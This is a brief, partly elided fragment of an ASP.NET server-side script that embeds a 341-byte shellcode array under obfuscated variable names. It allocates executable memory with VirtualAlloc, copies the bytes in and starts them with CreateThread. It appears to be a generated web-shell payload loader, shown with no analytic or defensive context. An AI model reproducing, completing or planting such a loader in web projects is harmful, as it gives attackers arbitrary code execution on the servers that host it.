...
<script runat="server">
    ...
    {
        byte[] mPuxCqnG8j9G = new byte[341] {
...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr s1tW = VirtualAlloc(IntPtr.Zero,(UIntPtr)mPuxCqnG8j9G.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(mPuxCqnG8j9G,0,s1tW,mPuxCqnG8j9G.Length);
        IntPtr e11 = IntPtr.Zero;
        IntPtr g52zrOwMz = CreateThread(IntPtr.Zero,UIntPtr.Zero,s1tW,IntPtr.Zero,0,ref e11);
    }
</script>
